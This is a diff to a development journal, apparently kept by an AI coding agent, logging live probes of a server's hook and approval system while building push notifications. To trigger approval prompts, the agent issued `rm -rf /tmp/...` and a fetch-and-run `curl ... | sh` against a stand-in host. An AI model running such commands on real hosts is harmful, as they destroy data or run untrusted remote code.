@@ -21,7 +21,7 @@ newest last. Models are the minimum; a higher one is fine.
 | 9.2 | **Push notifications** (`feat/push`) | | | |
 | P-spec | Brainstorm and design | Opus | done | `57f5882` |
 | P-plan | Implementation plan with segment table | Opus | done | see journal |
-| PS1 | Task 1: live probe (hooks, approval answering) | Opus | todo | |
+| PS1 | Task 1: live probe (hooks, approval answering) | Opus | doing | |
 | PS2 | Tasks 2–5: plugin registry, active chats, events, stream | Sonnet | todo | |
 | PS3 | Task 6: APNs sender and worker | Opus | todo | |
 | PS4 | Tasks 7–8: app settings, active marking, tap and approve-on-open | Sonnet | todo | |
@@ -535,3 +535,30 @@ written. Reorder 9.2–9.6 here if the user changes the order; 9.1 first and 9.7
 - Plan: `docs/superpowers/plans/2026-11-13-push.md` (12 tasks, segments PS1–PS7). Self-reviewed against the spec.
 - Plan-level decisions for the user to check: approval actions open Iris after unlock and answer there (no native WebSocket client); Iris marks active chats explicitly; device settings stored on the server; replay 15 min (stream) / 10 min (APNs); `flutter_local_notifications` on Android only; the one `flutter_foreground_task` service is shared with voice through an arbiter (`microphone|remoteMessaging`).
 - Next: the user reviews the plan; then PS1 (Opus), Task 1 live probe — ask before touching the server.
+
+### PS1 — doing — 2026-11-13 — Opus 5.5
+- User approved the plan and the probe ("start"). Finding (e) done over SSH (read only): the Hermes runtime (Python 3.14.7) has `httpx` 0.28.1, `cryptography` 50.0.1, `pyjwt` 2.13.0, `aiohttp`, `requests`, but **no `h2`** (httpx HTTP/2 unavailable); system `curl` 8.5.0 has HTTP2 (nghttp2). Needs the user's choice (plan step 7).
+- Installing the probe hooks on the server was refused by the session's permission check (remote writes). Waiting on the user to allow it or run the install themselves.
+- On disk, uncommitted: `test/live/push_probe_live_test.dart` (approval/reply/cron tests, analyze clean); probe hook module in the scratchpad (`push_probe.py`).
+- Next: install the probe hooks, run the live test, read `~/.hermes/iris/probe-push.jsonl`, write findings.
+
+### PS1 — blocked — 2026-11-13 — Opus 5.5
+- Probe hooks installed with the user's permission (`~/.hermes/plugins/iris/push_probe.py` + a wrapper at the end of `__init__.py`; backup `/root/iris-init.py.bak`). Dashboard restarted; it restarted itself once more at 23:14 ("port 9119 already in use"), then stayed up.
+- Findings so far: (b) the agent turn ran in a process other than the dashboard service's main pid at first, and hooks and routes share only files (plan holds). Per-turn `on_session_end` did **not** reach the plugin for dashboard turns; it fired only when a session closed (`completed: false, interrupted: true`, no `turn_id`). `post_llm_call` does fire per dashboard turn (GenUI "use" rows in `usage.jsonl`), so Task 4 should build `reply` on `post_llm_call`. Approval mode is the default `manual`, timeout default 300 s; `rm -rf` matches the dangerous patterns. The server runs a newer Hermes checkout (`0e427d788d`) than the tag read; the finalizer code is the same.
+- **Blocked:** the model provider fails every turn (NVIDIA NIM `HTTP 404 Function ... Not found for account`, same as G4), so no approval can be raised and turn hooks are unreliable to judge. Needs the user to fix the server's model/provider.
+- Next: after the fix, rerun `(d)`, `(reply)` (with the 60 s wait) and `(c)`; read `probe-push.jsonl`; then remove the probe and restore `/root/iris-init.py.bak`.
+
+### PS1 — blocked — 2026-11-13 — Opus 5.5 (second run)
+- User fixed the model (now `gpt-6-sol`). `(d)` with `rm -rf /tmp/...`: no `approval.request`. Hook rows show why: the server's `approvals.mode` is **smart**. `pre_approval_request` fired with `surface: "smart"`, then `post_approval_response` `choice: "smart_approve"`, `decided_by: "aux_llm"`. A person is asked only on a guardian DENY (owner override) or ESCALATE (`_smart_gate`, `tools/approval.py:761`), and that ask comes with `surface` `gateway`/`cli`. **Task 4 must not notify on `surface == "smart"`.**
+- (a) answered: hook `session_key` = `session_id` = the **stored** id (`20261113_051659_b9bbb3`), not the runtime id. Hook rows also carry `turn_id` and `tool_call_id`.
+- Reverses the first run's finding: with a working model, **`on_session_end` does fire per dashboard turn** (`turn_id`, `completed`/`failed`/`interrupted`, `turn_exit_reason`, `platform: "desktop"`), about 2 s after the approval response. Closing the chat fires a second `on_session_end` with no `turn_id` and `interrupted: true`. Task 4 can stay on `on_session_end`, keyed on rows that have a `turn_id`; no plan change to `post_llm_call` is needed.
+- (c) partly answered by an earlier scheduled run: `on_session_end` with `session_id` `cron_<job id>_<ts>`, `task_id` `cron:<job id>:<run>`, `completed: true`.
+- `(d)` rerun with an inert `curl -s http://iris-probe.invalid/setup.sh | sh`: `tool.start` arrived, then no `approval.request` and no `message.complete` within 5 min (test timed out; chat deleted). Could not read the hook rows: SSH to the server (Tailscale) timed out three times, while the dashboard answered over HTTPS (200).
+- **Blocked:** need SSH back to read the rows for `20261113_051824_771c8c` and see whether a human ask was raised and why the dashboard sent no `approval.request`.
+
+### PS1 — waiting on the user — 2026-11-13 — Opus 5.5 (third run)
+- SSH back. The `curl | sh` ask did reach a person (`surface: "gateway"`) and timed out at 300 s: the dashboard sends approvals as an `approval` **server request**, which the probe wasn't listening for. Probe fixed to use `DashboardSession.serverRequests`.
+- `(d)` passes: request arrives, fresh socket + resume, `approval.pending` lists it, `approval.respond` deny → `{resolved: 1}`, reply "denied". Not re-sent on the new socket.
+- `(reply)` passes; `on_session_end` row has `turn_id`, `completed: true`. `(c)` own job create timed out (load ≈ 10); cron payload taken from two real scheduled runs instead; no probe job left behind. Job name read from `cron/jobs.json` (`jobs[]`, `id`/`name`).
+- Findings in `docs/superpowers/plans/2026-11-13-push-probe.md`. Task 4 keeps `on_session_end` (ignore rows without `turn_id`) and must skip `surface == "smart"`.
+- Probe removal on the server was refused by the auto-mode classifier; the user runs `remove-probe.ps1` from the scratchpad. Waiting on the user's h2/curl call (Task 1 Step 7).
